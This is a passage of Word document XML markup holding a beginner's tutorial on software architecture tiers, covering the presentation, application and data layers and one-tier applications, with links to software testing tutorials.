          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="222222"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>11 Comments</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="entry-comments-link"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1294" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1295" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Software Architecture: Software Architecture consists of One Tier, Two Tier, Three Tier and N-Tier architectures.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1296" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1297" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>A “tier” can also be referred to as a “layer”.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1298" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1299" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Three layers involved in the application namely Presentation Layer, Business Layer and Data Layer. Let’s see each layer in detail:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1300" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1301" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>Presentation Layer:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t xml:space="preserve"> It is also known as Client layer. Top most layer of an application. This is the layer we see when we use </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>a software</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>. By using this layer we can access the webpages. The main functionality of this layer is to communicate with Application layer. This layer passes the information which is given by the user in terms of keyboard actions, mouse clicks to the Application Layer.</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:br/>
          <w:t>For example, login page of Gmail where an end user could see text boxes and buttons to enter user id, password and to click on sign-in.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1302" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="1303" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>In a simple words</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>, it is to view the application.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1304" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1305" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Check below video to see “Software Architecture”</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1306" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1307" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Please be patient. The video will load in some time.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1308" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1309" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>If you liked this video, then please subscribe to our YouTube Channel for more video tutorials.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1310" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1311" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Application Layer:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t xml:space="preserve"> It is also known as Business Logic Layer which is also known as logical layer. As per the </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>gmail</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t xml:space="preserve"> login page example, once user clicks on the login button, Application layer interacts with Database layer and sends required information to the Presentation layer. It controls an application’s functionality by performing detailed processing. This layer acts as a mediator between the Presentation and the Database layer. Complete business logic will be written in this layer.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1312" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="1313" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>In a simple words</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>, it is to perform operations on the application.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1314" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1315" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Data Layer:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t> The data is stored in this layer. Application layer communicates with Database layer to retrieve the data. It contains methods that connects the database and performs required action e.g.: insert, update, delete etc.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1316" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="1317" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>In a simple words</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>, it is to share and retrieve the data.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1318" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="888888"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1319" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="888888"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Must Read: </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="888888"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="888888"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "https://www.softwaretestingmaterial.com/manual-testing-tutorial/" </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="888888"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="E8554E"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Manual Testing Complete Tutorial</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="888888"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1320" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="222222"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1321" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="45"/>
            <w:szCs w:val="45"/>
          </w:rPr>
          <w:t>Types of Software Architecture:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="240"/>
        <w:rPr>
          <w:ins w:id="1322" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="222222"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="1323" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="36"/>
            <w:szCs w:val="36"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>One Tier Architecture</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="36"/>
            <w:szCs w:val="36"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1324" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1325" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>One Tier application AKA Standalone application</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1326" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:color w:val="E8554E"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5145405" cy="4588510"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="91" name="Picture 91" descr="One Tier Software Architecture">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ne Tier Software Architecture">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45405" cy="4588510"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1327" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1328" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t xml:space="preserve">One tier architecture has all the layers such as Presentation, Business, </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Data</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t xml:space="preserve"> Access layers in a single software package. </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Applications which handles</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t xml:space="preserve"> all the three tiers such as MP3 player, MS Office are come under one tier application. The data is stored in the local system or a shared drive.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1329" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="888888"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1330" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="888888"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Must Read: </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="888888"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="888888"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "https://www.softwaretestingmaterial.com/100-software-testing-interview-questions/" </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="888888"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="E8554E"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Most Popular Software Testing Interview Questions</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="888888"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="240"/>
        <w:rPr>
          <w:ins w:id="1331" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="222222"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1332" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
